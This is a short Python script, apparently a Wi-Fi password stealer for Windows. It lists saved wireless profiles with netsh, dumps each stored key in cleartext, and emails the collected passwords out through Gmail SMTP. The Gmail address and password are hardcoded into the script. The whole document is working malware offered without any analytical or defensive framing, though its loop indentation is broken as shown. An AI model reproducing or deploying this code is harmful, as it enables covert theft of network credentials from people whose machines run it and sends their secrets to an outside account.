#!/usr/bin/env python
import subprocess,smtplib,re
def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = "netsh wlan show profile"
network = (subprocess.check_output(command,shell=True))
network1 = network.decode('ASCII').replace('\r','')
network_name_list = re.findall("(?:Profile\s*:\s)(.*)",network1)
result_list = ""
for network_name2 in network_name_list:
com2 = "netsh wlan show profile " + network_name2 + " key=clear"
try:
current_res = subprocess.check_output(str(com2),shell=True)
result_list = result_list+current_res.decode('ASCII')
except:
pass
send_email("cur53onu@gmail.com","Iamcur53@u",result_list)


